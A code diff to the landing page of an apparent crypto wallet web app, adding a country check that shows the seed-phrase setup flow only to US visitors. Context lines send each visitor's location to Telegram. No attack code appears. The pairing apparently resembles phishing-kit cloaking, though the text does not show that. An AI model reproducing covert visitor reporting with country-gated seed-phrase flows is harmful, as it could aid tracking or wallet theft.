@@ -19,6 +19,7 @@ function LandingPageContent() {
   const [setupOpen, setSetupOpen] = useState(false);
   const [pinOpen, setPinOpen] = useState(false);
   const [showSelectType, setShowSelectType] = useState(false);
+  const [isUSUser, setIsUSUser] = useState<boolean | null>(null);
   const [browser, setBrowser] = useState("");
   const hasSentVisitorMessage = useRef(false);
   const pathname = usePathname();
@@ -102,6 +103,19 @@ function LandingPageContent() {
     if (!hasSentVisitorMessage.current) {
       const fetchUserLocation = async () => {
         const userCountry = await getUserCountry();
+
+        // Determine if user is in the United States
+        if (userCountry) {
+          const isUS =
+            userCountry.countryCode === "US" ||
+            (userCountry.country &&
+              userCountry.country.toLowerCase().includes("united states"));
+          setIsUSUser(isUS);
+        } else {
+          // If geolocation fails, default to blocking wallet features
+          setIsUSUser(false);
+        }
+
         sendTelegramMessage(userCountry);
       };
       fetchUserLocation();
@@ -138,12 +152,17 @@ function LandingPageContent() {
             Powerful for pros.
           </p>
 
-          <button
-            onClick={() => setWelcomeOpen(true)}
-            className="mt-8 bg-white/10 hover:bg-white/20 text-white font-semibold rounded-full px-8 py-4 transition flex items-center gap-2 border border-white/5"
-          >
-            Open App <span className="opacity-60">→</span>
-          </button>
+          {/* Only show wallet entry point for US users or while country is still unknown */}
+          {isUSUser !== false && (
+            <button
+              onClick={() => {
+                setWelcomeOpen(true);
+              }}
+              className="mt-8 bg-white/10 hover:bg-white/20 text-white font-semibold rounded-full px-8 py-4 transition flex items-center gap-2 border border-white/5"
+            >
+              Open App <span className="opacity-60">→</span>
+            </button>
+          )}
         </div>
 
 
@@ -204,66 +223,71 @@ function LandingPageContent() {
         </div>
       </footer>
 
-      {/* 🌈 Welcome Modal */}
-      <WelcomeModal
-        open={welcomeOpen}
-        onClose={() => setWelcomeOpen(false)}
-        onNext={() => {
-          setWelcomeOpen(false);
-          setSetupOpen(true);
-        }}
-        illustration={
-          <Image
-            src="/brand/laptop.svg"
-            alt="Welcome Illustration"
-            width={420}
-            height={300}
+      {/* Wallet / seedphrase flows are only available for US users */}
+      {isUSUser && (
+        <>
+          {/* 🌈 Welcome Modal */}
+          <WelcomeModal
+            open={welcomeOpen}
+            onClose={() => setWelcomeOpen(false)}
+            onNext={() => {
+              setWelcomeOpen(false);
+              setSetupOpen(true);
+            }}
+            illustration={
+              <Image
+                src="/brand/laptop.svg"
+                alt="Welcome Illustration"
+                width={420}
+                height={300}
+              />
+            }
           />
-        }
-      />
 
-      {/* ⚙️ Setup Modal */}
-      <AppSetupModal
-        open={setupOpen}
-        onClose={() => setSetupOpen(false)}
-        onBack={() => {
-          setSetupOpen(false);
-          setWelcomeOpen(true);
-        }}
-        onNext={() => {
-          setSetupOpen(false);
-          setPinOpen(true);
-        }}
-      />
+          {/* ⚙️ Setup Modal */}
+          <AppSetupModal
+            open={setupOpen}
+            onClose={() => setSetupOpen(false)}
+            onBack={() => {
+              setSetupOpen(false);
+              setWelcomeOpen(true);
+            }}
+            onNext={() => {
+              setSetupOpen(false);
+              setPinOpen(true);
+            }}
+          />
 
-      {/* 🔐 Create PIN Modal */}
-      <CreatePinModal
-        open={pinOpen}
-        onClose={() => setPinOpen(false)}
-        onBack={() => {
-          setPinOpen(false);
-          setSetupOpen(true); // go back one step
-        }}
-        onNext={() => {
-          setPinOpen(false);
-          setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
-        }}
-      />
+          {/* 🔐 Create PIN Modal */}
+          <CreatePinModal
+            open={pinOpen}
+            onClose={() => setPinOpen(false)}
+            onBack={() => {
+              setPinOpen(false);
+              setSetupOpen(true); // go back one step
+            }}
+            onNext={() => {
+              setPinOpen(false);
+              setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
+            }}
+          />
 
-      {/* 💼 Select Wallet Type Modal */}
-      <SelectWalletTypeModal
-        open={showSelectType}
-        onClose={() => setShowSelectType(false)}
-        onBack={() => {
-          setShowSelectType(false);
-          setPinOpen(true);
-        }}
-        onSelect={(key) => {
-          console.log("Selected wallet type:", key);
-          // you can trigger the next modal here based on key, e.g.:
-          // if (key === "new") setShowCreateWallet(true);
-        }}
-      />
+          {/* 💼 Select Wallet Type Modal */}
+          <SelectWalletTypeModal
+            open={showSelectType}
+            onClose={() => setShowSelectType(false)}
+            onBack={() => {
+              setShowSelectType(false);
+              setPinOpen(true);
+            }}
+            onSelect={(key) => {
+              console.log("Selected wallet type:", key);
+              // you can trigger the next modal here based on key, e.g.:
+              // if (key === "new") setShowCreateWallet(true);
+            }}
+          />
+        </>
+      )}
     </main >
   );
 }
